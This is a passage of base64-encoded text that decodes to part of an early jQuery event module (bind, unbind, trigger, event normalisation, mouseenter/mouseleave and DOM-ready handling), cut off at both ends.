S5hZGRFdmVudExpc3RlbmVyKHR5cGUsIGhhbmRsZSwgZmFsc2UpOwoJCQkJCQllbHNlIGlmIChlbGVtLmF0dGFjaEV2ZW50KQoJCQkJCQkJZWxlbS5hdHRhY2hFdmVudCgib24iICsgdHlwZSwgaGFuZGxlKTsKCQkJCQl9CgkJCQl9CgoJCQkJLy8gQWRkIHRoZSBmdW5jdGlvbiB0byB0aGUgZWxlbWVudCdzIGhhbmRsZXIgbGlzdAoJCQkJaGFuZGxlcnNbaGFuZGxlci5ndWlkXSA9IGhhbmRsZXI7CgoJCQkJLy8gS2VlcCB0cmFjayBvZiB3aGljaCBldmVudHMgaGF2ZSBiZWVuIHVzZWQsIGZvciBnbG9iYWwgdHJpZ2dlcmluZwoJCQkJalF1ZXJ5LmV2ZW50Lmdsb2JhbFt0eXBlXSA9IHRydWU7CgkJCX0pOwoJCQoJCS8vIE51bGxpZnkgZWxlbSB0byBwcmV2ZW50IG1lbW9yeSBsZWFrcyBpbiBJRQoJCWVsZW0gPSBudWxsOwoJfSwKCglndWlkOiAxLAoJZ2xvYmFsOiB7fSwKCgkvLyBEZXRhY2ggYW4gZXZlbnQgb3Igc2V0IG9mIGV2ZW50cyBmcm9tIGFuIGVsZW1lbnQKCXJlbW92ZTogZnVuY3Rpb24oZWxlbSwgdHlwZXMsIGhhbmRsZXIpIHsKCQkvLyBkb24ndCBkbyBldmVudHMgb24gdGV4dCBhbmQgY29tbWVudCBub2RlcwoJCWlmICggZWxlbS5ub2RlVHlwZSA9PSAzIHx8IGVsZW0ubm9kZVR5cGUgPT0gOCApCgkJCXJldHVybjsKCgkJdmFyIGV2ZW50cyA9IGpRdWVyeS5kYXRhKGVsZW0sICJldmVudHMiKSwgcmV0LCBpbmRleDsKCgkJaWYgKCBldmVudHMgKSB7CgkJCS8vIFVuYmluZCBhbGwgZXZlbnRzIGZvciB0aGUgZWxlbWVudAoJCQlpZiAoIHR5cGVzID09IHVuZGVmaW5lZCApCgkJCQlmb3IgKCB2YXIgdHlwZSBpbiBldmVudHMgKQoJCQkJCXRoaXMucmVtb3ZlKCBlbGVtLCB0eXBlICk7CgkJCWVsc2UgewoJCQkJLy8gdHlwZXMgaXMgYWN0dWFsbHkgYW4gZXZlbnQgb2JqZWN0IGhlcmUKCQkJCWlmICggdHlwZXMudHlwZSApIHsKCQkJCQloYW5kbGVyID0gdHlwZXMuaGFuZGxlcjsKCQkJCQl0eXBlcyA9IHR5cGVzLnR5cGU7CgkJCQl9CgkJCQkKCQkJCS8vIEhhbmRsZSBtdWx0aXBsZSBldmVudHMgc2VwZXJhdGVkIGJ5IGEgc3BhY2UKCQkJCS8vIGpRdWVyeSguLi4pLnVuYmluZCgibW91c2VvdmVyIG1vdXNlb3V0IiwgZm4pOwoJCQkJalF1ZXJ5LmVhY2godHlwZXMuc3BsaXQoL1xzKy8pLCBmdW5jdGlvbihpbmRleCwgdHlwZSl7CgkJCQkJLy8gTmFtZXNwYWNlZCBldmVudCBoYW5kbGVycwoJCQkJCXZhciBwYXJ0cyA9IHR5cGUuc3BsaXQoIi4iKTsKCQkJCQl0eXBlID0gcGFydHNbMF07CgkJCQkJCgkJCQkJaWYgKCBldmVudHNbdHlwZV0gKSB7CgkJCQkJCS8vIHJlbW92ZSB0aGUgZ2l2ZW4gaGFuZGxlciBmb3IgdGhlIGdpdmVuIHR5cGUKCQkJCQkJaWYgKCBoYW5kbGVyICkKCQkJCQkJCWRlbGV0ZSBldmVudHNbdHlwZV1baGFuZGxlci5ndWlkXTsKCQkJCgkJCQkJCS8vIHJlbW92ZSBhbGwgaGFuZGxlcnMgZm9yIHRoZSBnaXZlbiB0eXBlCgkJCQkJCWVsc2UKCQkJCQkJCWZvciAoIGhhbmRsZXIgaW4gZXZlbnRzW3R5cGVdICkKCQkJCQkJCQkvLyBIYW5kbGUgdGhlIHJlbW92YWwgb2YgbmFtZXNwYWNlZCBldmVudHMKCQkJCQkJCQlpZiAoICFwYXJ0c1sxXSB8fCBldmVudHNbdHlwZV1baGFuZGxlcl0udHlwZSA9PSBwYXJ0c1sxXSApCgkJCQkJCQkJCWRlbGV0ZSBldmVudHNbdHlwZV1baGFuZGxlcl07CgoJCQkJCQkvLyByZW1vdmUgZ2VuZXJpYyBldmVudCBoYW5kbGVyIGlmIG5vIG1vcmUgaGFuZGxlcnMgZXhpc3QKCQkJCQkJZm9yICggcmV0IGluIGV2ZW50c1t0eXBlXSApIGJyZWFrOwoJCQkJCQlpZiAoICFyZXQgKSB7CgkJCQkJCQlpZiAoICFqUXVlcnkuZXZlbnQuc3BlY2lhbFt0eXBlXSB8fCBqUXVlcnkuZXZlbnQuc3BlY2lhbFt0eXBlXS50ZWFyZG93bi5jYWxsKGVsZW0pID09PSBmYWxzZSApIHsKCQkJCQkJCQlpZiAoZWxlbS5yZW1vdmVFdmVudExpc3RlbmVyKQoJCQkJCQkJCQllbGVtLnJlbW92ZUV2ZW50TGlzdGVuZXIodHlwZSwgalF1ZXJ5LmRhdGEoZWxlbSwgImhhbmRsZSIpLCBmYWxzZSk7CgkJCQkJCQkJZWxzZSBpZiAoZWxlbS5kZXRhY2hFdmVudCkKCQkJCQkJCQkJZWxlbS5kZXRhY2hFdmVudCgib24iICsgdHlwZSwgalF1ZXJ5LmRhdGEoZWxlbSwgImhhbmRsZSIpKTsKCQkJCQkJCX0KCQkJCQkJCXJldCA9IG51bGw7CgkJCQkJCQlkZWxldGUgZXZlbnRzW3R5cGVdOwoJCQkJCQl9CgkJCQkJfQoJCQkJfSk7CgkJCX0KCgkJCS8vIFJlbW92ZSB0aGUgZXhwYW5kbyBpZiBpdCdzIG5vIGxvbmdlciB1c2VkCgkJCWZvciAoIHJldCBpbiBldmVudHMgKSBicmVhazsKCQkJaWYgKCAhcmV0ICkgewoJCQkJdmFyIGhhbmRsZSA9IGpRdWVyeS5kYXRhKCBlbGVtLCAiaGFuZGxlIiApOwoJCQkJaWYgKCBoYW5kbGUgKSBoYW5kbGUuZWxlbSA9IG51bGw7CgkJCQlqUXVlcnkucmVtb3ZlRGF0YSggZWxlbSwgImV2ZW50cyIgKTsKCQkJCWpRdWVyeS5yZW1vdmVEYXRhKCBlbGVtLCAiaGFuZGxlIiApOwoJCQl9CgkJfQoJfSwKCgl0cmlnZ2VyOiBmdW5jdGlvbih0eXBlLCBkYXRhLCBlbGVtLCBkb25hdGl2ZSwgZXh0cmEpIHsKCQkvLyBDbG9uZSB0aGUgaW5jb21pbmcgZGF0YSwgaWYgYW55CgkJZGF0YSA9IGpRdWVyeS5tYWtlQXJyYXkoZGF0YSB8fCBbXSk7CgoJCS8vIEhhbmRsZSBhIGdsb2JhbCB0cmlnZ2VyCgkJaWYgKCAhZWxlbSApIHsKCQkJLy8gT25seSB0cmlnZ2VyIGlmIHdlJ3ZlIGV2ZXIgYm91bmQgYW4gZXZlbnQgZm9yIGl0CgkJCWlmICggdGhpcy5nbG9iYWxbdHlwZV0gKQoJCQkJalF1ZXJ5KCIqIikuYWRkKFt3aW5kb3csIGRvY3VtZW50XSkudHJpZ2dlcih0eXBlLCBkYXRhKTsKCgkJLy8gSGFuZGxlIHRyaWdnZXJpbmcgYSBzaW5nbGUgZWxlbWVudAoJCX0gZWxzZSB7CgkJCS8vIGRvbid0IGRvIGV2ZW50cyBvbiB0ZXh0IGFuZCBjb21tZW50IG5vZGVzCgkJCWlmICggZWxlbS5ub2RlVHlwZSA9PSAzIHx8IGVsZW0ubm9kZVR5cGUgPT0gOCApCgkJCQlyZXR1cm4gdW5kZWZpbmVkOwoKCQkJdmFyIHZhbCwgcmV0LCBmbiA9IGpRdWVyeS5pc0Z1bmN0aW9uKCBlbGVtWyB0eXBlIF0gfHwgbnVsbCApLAoJCQkJLy8gQ2hlY2sgdG8gc2VlIGlmIHdlIG5lZWQgdG8gcHJvdmlkZSBhIGZha2UgZXZlbnQsIG9yIG5vdAoJCQkJZXZlbnQgPSAhZGF0YVswXSB8fCAhZGF0YVswXS5wcmV2ZW50RGVmYXVsdDsKCQkJCgkJCS8vIFBhc3MgYWxvbmcgYSBmYWtlIGV2ZW50CgkJCWlmICggZXZlbnQgKQoJCQkJZGF0YS51bnNoaWZ0KCB0aGlzLmZpeCh7IHR5cGU6IHR5cGUsIHRhcmdldDogZWxlbSB9KSApOwoKCQkJLy8gRW5mb3JjZSB0aGUgcmlnaHQgdHJpZ2dlciB0eXBlCgkJCWRhdGFbMF0udHlwZSA9IHR5cGU7CgoJCQkvLyBUcmlnZ2VyIHRoZSBldmVudAoJCQlpZiAoIGpRdWVyeS5pc0Z1bmN0aW9uKCBqUXVlcnkuZGF0YShlbGVtLCAiaGFuZGxlIikgKSApCgkJCQl2YWwgPSBqUXVlcnkuZGF0YShlbGVtLCAiaGFuZGxlIikuYXBwbHkoIGVsZW0sIGRhdGEgKTsKCgkJCS8vIEhhbmRsZSB0cmlnZ2VyaW5nIG5hdGl2ZSAub25mb28gaGFuZGxlcnMKCQkJaWYgKCAhZm4gJiYgZWxlbVsib24iK3R5cGVdICYmIGVsZW1bIm9uIit0eXBlXS5hcHBseSggZWxlbSwgZGF0YSApID09PSBmYWxzZSApCgkJCQl2YWwgPSBmYWxzZTsKCgkJCS8vIEV4dHJhIGZ1bmN0aW9ucyBkb24ndCBnZXQgdGhlIGN1c3RvbSBldmVudCBvYmplY3QKCQkJaWYgKCBldmVudCApCgkJCQlkYXRhLnNoaWZ0KCk7CgoJCQkvLyBIYW5kbGUgdHJpZ2dlcmluZyBvZiBleHRyYSBmdW5jdGlvbgoJCQlpZiAoIGV4dHJhICYmIGpRdWVyeS5pc0Z1bmN0aW9uKCBleHRyYSApICkgewoJCQkJLy8gY2FsbCB0aGUgZXh0cmEgZnVuY3Rpb24gYW5kIHRhY2sgdGhlIGN1cnJlbnQgcmV0dXJuIHZhbHVlIG9uIHRoZSBlbmQgZm9yIHBvc3NpYmxlIGluc3BlY3Rpb24KCQkJCXJldCA9IGV4dHJhLmFwcGx5KCBlbGVtLCB2YWwgPT0gbnVsbCA/IGRhdGEgOiBkYXRhLmNvbmNhdCggdmFsICkgKTsKCQkJCS8vIGlmIGFueXRoaW5nIGlzIHJldHVybmVkLCBnaXZlIGl0IHByZWNlZGVuY2UgYW5kIGhhdmUgaXQgb3ZlcndyaXRlIHRoZSBwcmV2aW91cyB2YWx1ZQoJCQkJaWYgKHJldCAhPT0gdW5kZWZpbmVkKQoJCQkJCXZhbCA9IHJldDsKCQkJfQoKCQkJLy8gVHJpZ2dlciB0aGUgbmF0aXZlIGV2ZW50cyAoZXhjZXB0IGZvciBjbGlja3Mgb24gbGlua3MpCgkJCWlmICggZm4gJiYgZG9uYXRpdmUgIT09IGZhbHNlICYmIHZhbCAhPT0gZmFsc2UgJiYgIShqUXVlcnkubm9kZU5hbWUoZWxlbSwgJ2EnKSAmJiB0eXBlID09ICJjbGljayIpICkgewoJCQkJdGhpcy50cmlnZ2VyZWQgPSB0cnVlOwoJCQkJdHJ5IHsKCQkJCQllbGVtWyB0eXBlIF0oKTsKCQkJCS8vIHByZXZlbnQgSUUgZnJvbSB0aHJvd2luZyBhbiBlcnJvciBmb3Igc29tZSBoaWRkZW4gZWxlbWVudHMKCQkJCX0gY2F0Y2ggKGUpIHt9CgkJCX0KCgkJCXRoaXMudHJpZ2dlcmVkID0gZmFsc2U7CgkJfQoKCQlyZXR1cm4gdmFsOwoJfSwKCgloYW5kbGU6IGZ1bmN0aW9uKGV2ZW50KSB7CgkJLy8gcmV0dXJuZWQgdW5kZWZpbmVkIG9yIGZhbHNlCgkJdmFyIHZhbDsKCgkJLy8gRW1wdHkgb2JqZWN0IGlzIGZvciB0cmlnZ2VyZWQgZXZlbnRzIHdpdGggbm8gZGF0YQoJCWV2ZW50ID0galF1ZXJ5LmV2ZW50LmZpeCggZXZlbnQgfHwgd2luZG93LmV2ZW50IHx8IHt9ICk7IAoKCQkvLyBOYW1lc3BhY2VkIGV2ZW50IGhhbmRsZXJzCgkJdmFyIHBhcnRzID0gZXZlbnQudHlwZS5zcGxpdCgiLiIpOwoJCWV2ZW50LnR5cGUgPSBwYXJ0c1swXTsKCgkJdmFyIGhhbmRsZXJzID0galF1ZXJ5LmRhdGEodGhpcywgImV2ZW50cyIpICYmIGpRdWVyeS5kYXRhKHRoaXMsICJldmVudHMiKVtldmVudC50eXBlXSwgYXJncyA9IEFycmF5LnByb3RvdHlwZS5zbGljZS5jYWxsKCBhcmd1bWVudHMsIDEgKTsKCQlhcmdzLnVuc2hpZnQoIGV2ZW50ICk7CgoJCWZvciAoIHZhciBqIGluIGhhbmRsZXJzICkgewoJCQl2YXIgaGFuZGxlciA9IGhhbmRsZXJzW2pdOwoJCQkvLyBQYXNzIGluIGEgcmVmZXJlbmNlIHRvIHRoZSBoYW5kbGVyIGZ1bmN0aW9uIGl0c2VsZgoJCQkvLyBTbyB0aGF0IHdlIGNhbiBsYXRlciByZW1vdmUgaXQKCQkJYXJnc1swXS5oYW5kbGVyID0gaGFuZGxlcjsKCQkJYXJnc1swXS5kYXRhID0gaGFuZGxlci5kYXRhOwoKCQkJLy8gRmlsdGVyIHRoZSBmdW5jdGlvbnMgYnkgY2xhc3MKCQkJaWYgKCAhcGFydHNbMV0gfHwgaGFuZGxlci50eXBlID09IHBhcnRzWzFdICkgewoJCQkJdmFyIHJldCA9IGhhbmRsZXIuYXBwbHkoIHRoaXMsIGFyZ3MgKTsKCgkJCQlpZiAoIHZhbCAhPT0gZmFsc2UgKQoJCQkJCXZhbCA9IHJldDsKCgkJCQlpZiAoIHJldCA9PT0gZmFsc2UgKSB7CgkJCQkJZXZlbnQucHJldmVudERlZmF1bHQoKTsKCQkJCQlldmVudC5zdG9wUHJvcGFnYXRpb24oKTsKCQkJCX0KCQkJfQoJCX0KCgkJLy8gQ2xlYW4gdXAgYWRkZWQgcHJvcGVydGllcyBpbiBJRSB0byBwcmV2ZW50IG1lbW9yeSBsZWFrCgkJaWYgKGpRdWVyeS5icm93c2VyLm1zaWUpCgkJCWV2ZW50LnRhcmdldCA9IGV2ZW50LnByZXZlbnREZWZhdWx0ID0gZXZlbnQuc3RvcFByb3BhZ2F0aW9uID0KCQkJCWV2ZW50LmhhbmRsZXIgPSBldmVudC5kYXRhID0gbnVsbDsKCgkJcmV0dXJuIHZhbDsKCX0sCgoJZml4OiBmdW5jdGlvbihldmVudCkgewoJCS8vIHN0b3JlIGEgY29weSBvZiB0aGUgb3JpZ2luYWwgZXZlbnQgb2JqZWN0IAoJCS8vIGFuZCBjbG9uZSB0byBzZXQgcmVhZC1vbmx5IHByb3BlcnRpZXMKCQl2YXIgb3JpZ2luYWxFdmVudCA9IGV2ZW50OwoJCWV2ZW50ID0galF1ZXJ5LmV4dGVuZCh7fSwgb3JpZ2luYWxFdmVudCk7CgkJCgkJLy8gYWRkIHByZXZlbnREZWZhdWx0IGFuZCBzdG9wUHJvcGFnYXRpb24gc2luY2UgCgkJLy8gdGhleSB3aWxsIG5vdCB3b3JrIG9uIHRoZSBjbG9uZQoJCWV2ZW50LnByZXZlbnREZWZhdWx0ID0gZnVuY3Rpb24oKSB7CgkJCS8vIGlmIHByZXZlbnREZWZhdWx0IGV4aXN0cyBydW4gaXQgb24gdGhlIG9yaWdpbmFsIGV2ZW50CgkJCWlmIChvcmlnaW5hbEV2ZW50LnByZXZlbnREZWZhdWx0KQoJCQkJb3JpZ2luYWxFdmVudC5wcmV2ZW50RGVmYXVsdCgpOwoJCQkvLyBvdGhlcndpc2Ugc2V0IHRoZSByZXR1cm5WYWx1ZSBwcm9wZXJ0eSBvZiB0aGUgb3JpZ2luYWwgZXZlbnQgdG8gZmFsc2UgKElFKQoJCQlvcmlnaW5hbEV2ZW50LnJldHVyblZhbHVlID0gZmFsc2U7CgkJfTsKCQlldmVudC5zdG9wUHJvcGFnYXRpb24gPSBmdW5jdGlvbigpIHsKCQkJLy8gaWYgc3RvcFByb3BhZ2F0aW9uIGV4aXN0cyBydW4gaXQgb24gdGhlIG9yaWdpbmFsIGV2ZW50CgkJCWlmIChvcmlnaW5hbEV2ZW50LnN0b3BQcm9wYWdhdGlvbikKCQkJCW9yaWdpbmFsRXZlbnQuc3RvcFByb3BhZ2F0aW9uKCk7CgkJCS8vIG90aGVyd2lzZSBzZXQgdGhlIGNhbmNlbEJ1YmJsZSBwcm9wZXJ0eSBvZiB0aGUgb3JpZ2luYWwgZXZlbnQgdG8gdHJ1ZSAoSUUpCgkJCW9yaWdpbmFsRXZlbnQuY2FuY2VsQnViYmxlID0gdHJ1ZTsKCQl9OwoJCQoJCS8vIEZpeCB0YXJnZXQgcHJvcGVydHksIGlmIG5lY2Vzc2FyeQoJCWlmICggIWV2ZW50LnRhcmdldCApCgkJCWV2ZW50LnRhcmdldCA9IGV2ZW50LnNyY0VsZW1lbnQgfHwgZG9jdW1lbnQ7IC8vIEZpeGVzICMxOTI1IHdoZXJlIHNyY0VsZW1lbnQgbWlnaHQgbm90IGJlIGRlZmluZWQgZWl0aGVyCgkJCQkKCQkvLyBjaGVjayBpZiB0YXJnZXQgaXMgYSB0ZXh0bm9kZSAoc2FmYXJpKQoJCWlmICggZXZlbnQudGFyZ2V0Lm5vZGVUeXBlID09IDMgKQoJCQlldmVudC50YXJnZXQgPSBvcmlnaW5hbEV2ZW50LnRhcmdldC5wYXJlbnROb2RlOwoKCQkvLyBBZGQgcmVsYXRlZFRhcmdldCwgaWYgbmVjZXNzYXJ5CgkJaWYgKCAhZXZlbnQucmVsYXRlZFRhcmdldCAmJiBldmVudC5mcm9tRWxlbWVudCApCgkJCWV2ZW50LnJlbGF0ZWRUYXJnZXQgPSBldmVudC5mcm9tRWxlbWVudCA9PSBldmVudC50YXJnZXQgPyBldmVudC50b0VsZW1lbnQgOiBldmVudC5mcm9tRWxlbWVudDsKCgkJLy8gQ2FsY3VsYXRlIHBhZ2VYL1kgaWYgbWlzc2luZyBhbmQgY2xpZW50WC9ZIGF2YWlsYWJsZQoJCWlmICggZXZlbnQucGFnZVggPT0gbnVsbCAmJiBldmVudC5jbGllbnRYICE9IG51bGwgKSB7CgkJCXZhciBkb2MgPSBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQsIGJvZHkgPSBkb2N1bWVudC5ib2R5OwoJCQlldmVudC5wYWdlWCA9IGV2ZW50LmNsaWVudFggKyAoZG9jICYmIGRvYy5zY3JvbGxMZWZ0IHx8IGJvZHkgJiYgYm9keS5zY3JvbGxMZWZ0IHx8IDApIC0gKGRvYy5jbGllbnRMZWZ0IHx8IDApOwoJCQlldmVudC5wYWdlWSA9IGV2ZW50LmNsaWVudFkgKyAoZG9jICYmIGRvYy5zY3JvbGxUb3AgfHwgYm9keSAmJiBib2R5LnNjcm9sbFRvcCB8fCAwKSAtIChkb2MuY2xpZW50VG9wIHx8IDApOwoJCX0KCQkJCgkJLy8gQWRkIHdoaWNoIGZvciBrZXkgZXZlbnRzCgkJaWYgKCAhZXZlbnQud2hpY2ggJiYgKChldmVudC5jaGFyQ29kZSB8fCBldmVudC5jaGFyQ29kZSA9PT0gMCkgPyBldmVudC5jaGFyQ29kZSA6IGV2ZW50LmtleUNvZGUpICkKCQkJZXZlbnQud2hpY2ggPSBldmVudC5jaGFyQ29kZSB8fCBldmVudC5rZXlDb2RlOwoJCQoJCS8vIEFkZCBtZXRhS2V5IHRvIG5vbi1NYWMgYnJvd3NlcnMgKHVzZSBjdHJsIGZvciBQQydzIGFuZCBNZXRhIGZvciBNYWNzKQoJCWlmICggIWV2ZW50Lm1ldGFLZXkgJiYgZXZlbnQuY3RybEtleSApCgkJCWV2ZW50Lm1ldGFLZXkgPSBldmVudC5jdHJsS2V5OwoKCQkvLyBBZGQgd2hpY2ggZm9yIGNsaWNrOiAxID09IGxlZnQ7IDIgPT0gbWlkZGxlOyAzID09IHJpZ2h0CgkJLy8gTm90ZTogYnV0dG9uIGlzIG5vdCBub3JtYWxpemVkLCBzbyBkb24ndCB1c2UgaXQKCQlpZiAoICFldmVudC53aGljaCAmJiBldmVudC5idXR0b24gKQoJCQlldmVudC53aGljaCA9IChldmVudC5idXR0b24gJiAxID8gMSA6ICggZXZlbnQuYnV0dG9uICYgMiA/IDMgOiAoIGV2ZW50LmJ1dHRvbiAmIDQgPyAyIDogMCApICkpOwoJCQkKCQlyZXR1cm4gZXZlbnQ7Cgl9LAoJCglzcGVjaWFsOiB7CgkJcmVhZHk6IHsKCQkJc2V0dXA6IGZ1bmN0aW9uKCkgewoJCQkJLy8gTWFrZSBzdXJlIHRoZSByZWFkeSBldmVudCBpcyBzZXR1cAoJCQkJYmluZFJlYWR5KCk7CgkJCQlyZXR1cm47CgkJCX0sCgkJCQoJCQl0ZWFyZG93bjogZnVuY3Rpb24oKSB7IHJldHVybjsgfQoJCX0sCgkJCgkJbW91c2VlbnRlcjogewoJCQlzZXR1cDogZnVuY3Rpb24oKSB7CgkJCQlpZiAoIGpRdWVyeS5icm93c2VyLm1zaWUgKSByZXR1cm4gZmFsc2U7CgkJCQlqUXVlcnkodGhpcykuYmluZCgibW91c2VvdmVyIiwgalF1ZXJ5LmV2ZW50LnNwZWNpYWwubW91c2VlbnRlci5oYW5kbGVyKTsKCQkJCXJldHVybiB0cnVlOwoJCQl9LAoJCQoJCQl0ZWFyZG93bjogZnVuY3Rpb24oKSB7CgkJCQlpZiAoIGpRdWVyeS5icm93c2VyLm1zaWUgKSByZXR1cm4gZmFsc2U7CgkJCQlqUXVlcnkodGhpcykudW5iaW5kKCJtb3VzZW92ZXIiLCBqUXVlcnkuZXZlbnQuc3BlY2lhbC5tb3VzZWVudGVyLmhhbmRsZXIpOwoJCQkJcmV0dXJuIHRydWU7CgkJCX0sCgkJCQoJCQloYW5kbGVyOiBmdW5jdGlvbihldmVudCkgewoJCQkJLy8gSWYgd2UgYWN0dWFsbHkganVzdCBtb3VzZWQgb24gdG8gYSBzdWItZWxlbWVudCwgaWdub3JlIGl0CgkJCQlpZiAoIHdpdGhpbkVsZW1lbnQoZXZlbnQsIHRoaXMpICkgcmV0dXJuIHRydWU7CgkJCQkvLyBFeGVjdXRlIHRoZSByaWdodCBoYW5kbGVycyBieSBzZXR0aW5nIHRoZSBldmVudCB0eXBlIHRvIG1vdXNlZW50ZXIKCQkJCWFyZ3VtZW50c1swXS50eXBlID0gIm1vdXNlZW50ZXIiOwoJCQkJcmV0dXJuIGpRdWVyeS5ldmVudC5oYW5kbGUuYXBwbHkodGhpcywgYXJndW1lbnRzKTsKCQkJfQoJCX0sCgkKCQltb3VzZWxlYXZlOiB7CgkJCXNldHVwOiBmdW5jdGlvbigpIHsKCQkJCWlmICggalF1ZXJ5LmJyb3dzZXIubXNpZSApIHJldHVybiBmYWxzZTsKCQkJCWpRdWVyeSh0aGlzKS5iaW5kKCJtb3VzZW91dCIsIGpRdWVyeS5ldmVudC5zcGVjaWFsLm1vdXNlbGVhdmUuaGFuZGxlcik7CgkJCQlyZXR1cm4gdHJ1ZTsKCQkJfSwKCQkKCQkJdGVhcmRvd246IGZ1bmN0aW9uKCkgewoJCQkJaWYgKCBqUXVlcnkuYnJvd3Nlci5tc2llICkgcmV0dXJuIGZhbHNlOwoJCQkJalF1ZXJ5KHRoaXMpLnVuYmluZCgibW91c2VvdXQiLCBqUXVlcnkuZXZlbnQuc3BlY2lhbC5tb3VzZWxlYXZlLmhhbmRsZXIpOwoJCQkJcmV0dXJuIHRydWU7CgkJCX0sCgkJCQoJCQloYW5kbGVyOiBmdW5jdGlvbihldmVudCkgewoJCQkJLy8gSWYgd2UgYWN0dWFsbHkganVzdCBtb3VzZWQgb24gdG8gYSBzdWItZWxlbWVudCwgaWdub3JlIGl0CgkJCQlpZiAoIHdpdGhpbkVsZW1lbnQoZXZlbnQsIHRoaXMpICkgcmV0dXJuIHRydWU7CgkJCQkvLyBFeGVjdXRlIHRoZSByaWdodCBoYW5kbGVycyBieSBzZXR0aW5nIHRoZSBldmVudCB0eXBlIHRvIG1vdXNlbGVhdmUKCQkJCWFyZ3VtZW50c1swXS50eXBlID0gIm1vdXNlbGVhdmUiOwoJCQkJcmV0dXJuIGpRdWVyeS5ldmVudC5oYW5kbGUuYXBwbHkodGhpcywgYXJndW1lbnRzKTsKCQkJfQoJCX0KCX0KfTsKCmpRdWVyeS5mbi5leHRlbmQoewoJYmluZDogZnVuY3Rpb24oIHR5cGUsIGRhdGEsIGZuICkgewoJCXJldHVybiB0eXBlID09ICJ1bmxvYWQiID8gdGhpcy5vbmUodHlwZSwgZGF0YSwgZm4pIDogdGhpcy5lYWNoKGZ1bmN0aW9uKCl7CgkJCWpRdWVyeS5ldmVudC5hZGQoIHRoaXMsIHR5cGUsIGZuIHx8IGRhdGEsIGZuICYmIGRhdGEgKTsKCQl9KTsKCX0sCgkKCW9uZTogZnVuY3Rpb24oIHR5cGUsIGRhdGEsIGZuICkgewoJCXJldHVybiB0aGlzLmVhY2goZnVuY3Rpb24oKXsKCQkJalF1ZXJ5LmV2ZW50LmFkZCggdGhpcywgdHlwZSwgZnVuY3Rpb24oZXZlbnQpIHsKCQkJCWpRdWVyeSh0aGlzKS51bmJpbmQoZXZlbnQpOwoJCQkJcmV0dXJuIChmbiB8fCBkYXRhKS5hcHBseSggdGhpcywgYXJndW1lbnRzKTsKCQkJfSwgZm4gJiYgZGF0YSk7CgkJfSk7Cgl9LAoKCXVuYmluZDogZnVuY3Rpb24oIHR5cGUsIGZuICkgewoJCXJldHVybiB0aGlzLmVhY2goZnVuY3Rpb24oKXsKCQkJalF1ZXJ5LmV2ZW50LnJlbW92ZSggdGhpcywgdHlwZSwgZm4gKTsKCQl9KTsKCX0sCgoJdHJpZ2dlcjogZnVuY3Rpb24oIHR5cGUsIGRhdGEsIGZuICkgewoJCXJldHVybiB0aGlzLmVhY2goZnVuY3Rpb24oKXsKCQkJalF1ZXJ5LmV2ZW50LnRyaWdnZXIoIHR5cGUsIGRhdGEsIHRoaXMsIHRydWUsIGZuICk7CgkJfSk7Cgl9LAoKCXRyaWdnZXJIYW5kbGVyOiBmdW5jdGlvbiggdHlwZSwgZGF0YSwgZm4gKSB7CgkJaWYgKCB0aGlzWzBdICkKCQkJcmV0dXJuIGpRdWVyeS5ldmVudC50cmlnZ2VyKCB0eXBlLCBkYXRhLCB0aGlzWzBdLCBmYWxzZSwgZm4gKTsKCQlyZXR1cm4gdW5kZWZpbmVkOwoJfSwKCgl0b2dnbGU6IGZ1bmN0aW9uKCkgewoJCS8vIFNhdmUgcmVmZXJlbmNlIHRvIGFyZ3VtZW50cyBmb3IgYWNjZXNzIGluIGNsb3N1cmUKCQl2YXIgYXJncyA9IGFyZ3VtZW50czsKCgkJcmV0dXJuIHRoaXMuY2xpY2soZnVuY3Rpb24oZXZlbnQpIHsKCQkJLy8gRmlndXJlIG91dCB3aGljaCBmdW5jdGlvbiB0byBleGVjdXRlCgkJCXRoaXMubGFzdFRvZ2dsZSA9IDAgPT0gdGhpcy5sYXN0VG9nZ2xlID8gMSA6IDA7CgkJCQoJCQkvLyBNYWtlIHN1cmUgdGhhdCBjbGlja3Mgc3RvcAoJCQlldmVudC5wcmV2ZW50RGVmYXVsdCgpOwoJCQkKCQkJLy8gYW5kIGV4ZWN1dGUgdGhlIGZ1bmN0aW9uCgkJCXJldHVybiBhcmdzW3RoaXMubGFzdFRvZ2dsZV0uYXBwbHkoIHRoaXMsIGFyZ3VtZW50cyApIHx8IGZhbHNlOwoJCX0pOwoJfSwKCglob3ZlcjogZnVuY3Rpb24oZm5PdmVyLCBmbk91dCkgewoJCXJldHVybiB0aGlzLmJpbmQoJ21vdXNlZW50ZXInLCBmbk92ZXIpLmJpbmQoJ21vdXNlbGVhdmUnLCBmbk91dCk7Cgl9LAoJCglyZWFkeTogZnVuY3Rpb24oZm4pIHsKCQkvLyBBdHRhY2ggdGhlIGxpc3RlbmVycwoJCWJpbmRSZWFkeSgpOwoKCQkvLyBJZiB0aGUgRE9NIGlzIGFscmVhZHkgcmVhZHkKCQlpZiAoIGpRdWVyeS5pc1JlYWR5ICkKCQkJLy8gRXhlY3V0ZSB0aGUgZnVuY3Rpb24gaW1tZWRpYXRlbHkKCQkJZm4uY2FsbCggZG9jdW1lbnQsIGpRdWVyeSApOwoJCQkKCQkvLyBPdGhlcndpc2UsIHJlbWVtYmVyIHRoZSBmdW5jdGlvbiBmb3IgbGF0ZXIKCQllbHNlCgkJCS8vIEFkZCB0aGUgZnVuY3Rpb24gdG8gdGhlIHdhaXQgbGlzdAoJCQlqUXVlcnkucmVhZHlMaXN0LnB1c2goIGZ1bmN0aW9uKCkgeyByZXR1cm4gZm4uY2FsbCh0aGlzLCBqUXVlcnkpOyB9ICk7CgkKCQlyZXR1cm4gdGhpczsKCX0KfSk7CgpqUXVlcnkuZXh0ZW5kKHsKCWlzUmVhZHk6IGZhbHNlLAoJcmVhZHlMaXN0OiBbXSwKCS8vIEhhbmRsZSB3aGVuIHRoZSBET00gaXMgcmVhZHkKCXJlYWR5OiBmdW5jdGlvbigpIHsKCQkvLyBNYWtlIHN1cmUgdGhhdCB0aGUgRE9NIGlzIG5vdCBhbHJlYWR5IGxvYWRlZAoJCWlmICggIWpRdWVyeS5pc1JlYWR5ICkgewoJCQkvLyBSZW1lbWJlciB0aGF0IHRoZSBET00gaXMgcmVhZHkKCQkJalF1ZXJ5LmlzUmVhZHkgPSB0cnVlOwoJCQkKCQkJLy8gSWYgdGhlcmUgYXJlIGZ1bmN0aW9ucyBib3VuZCwgdG8gZXhlY3V0ZQoJCQlpZiAoIGpRdWVyeS5yZWFkeUxpc3QgKSB7CgkJCQkvLyBFeGVjdXRlIGFsbCBvZiB0aGVtCgkJCQlqUXVlcnkuZWFjaCggalF1ZXJ5LnJlYWR5T